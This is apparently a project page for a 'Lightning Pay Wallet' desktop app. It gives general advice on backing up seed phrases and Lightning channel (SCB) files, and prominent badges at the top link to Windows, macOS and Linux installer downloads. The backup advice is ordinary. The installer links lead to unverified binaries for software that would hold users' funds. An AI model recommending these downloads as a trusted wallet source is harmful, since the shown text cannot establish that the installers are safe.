<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# Backing up a Lightning wallet: the seed phrase and the SCB file

Two different backups protect two different things, and one of them is easy to forget.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

A Lightning wallet holds two kinds of value: the keys that control on-chain bitcoin, and the state of
the channels that hold Lightning balances. One backup does not cover both, which is why recovery
questions here have two answers.

## The seed phrase

The seed phrase is a sequence of words that regenerates the wallet's keys. It is the backup that
matters most, and it is the one to write down first: on paper, offline, in more than one place, and
never in a screenshot in a cloud folder.

Anyone who has the phrase can spend the funds. There is no password on top of it in a non-custodial
wallet, so the phrase is the wallet. Treat a photograph of it as a copy of your money.

## The channel backup

Lightning balances live in channels, and a channel is a shared account between two nodes. Restoring
the keys alone does not always restore the channel state, which is why wallets produce a separate
channel backup, often called an SCB file.

Keep it. It is small, it is not secret in the same way the phrase is, and without it a restore can
recover on-chain funds while leaving channel balances stranded. Where the wallet offers to save one,
save it somewhere you will still have it in a year.

## What a backup is not

A backup is not a copy of the application's data folder, and copying the app between machines is not a
restore. It is also not a substitute for the phrase: a channel backup without the keys is not enough,
and the keys without the backup may not be either.

## When to take one

At the start, before the wallet holds anything. Again after any change you would not want to repeat,
such as receiving a large payment. And whenever the wallet prompts you, because a prompt usually means
the state changed in a way the old backup does not describe.

## The build gap worth knowing

The BIP-39 standard is what makes a phrase portable between wallets, and it is what most recovery
guides assume. This page describes what the standard gives rather than claiming the current build
generates a BIP-39 phrase in every case. Before relying on a restore, test it: create a wallet, note
the phrase, move a small amount, restore from the phrase on the same machine, and confirm the funds
appear. That test costs a few minutes and it is the only proof that matters for your setup.

## Questions people ask

### Can I restore with the phrase alone?

For on-chain funds, usually. For channel balances, you may also need the channel backup.

### Where should I keep the phrase?

Offline and duplicated: paper in two places beats a file in one. Never in a note app or a photo roll.

### What if I lose both?

Then the funds are gone. There is no support process that can recover them, because there is no server
that holds them.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-a-bitcoin-wallet-with-a-seed-phrase.md">Recovering a bitcoin wallet with a seed phrase</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/when-lightning-recovery-fails.md">When a Lightning recovery fails: no seed, an SCB, or an unsupported restore</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-you-hold-in-a-lightning-wallet.md">What you actually hold in a Lightning wallet, and how keys are kept</a>

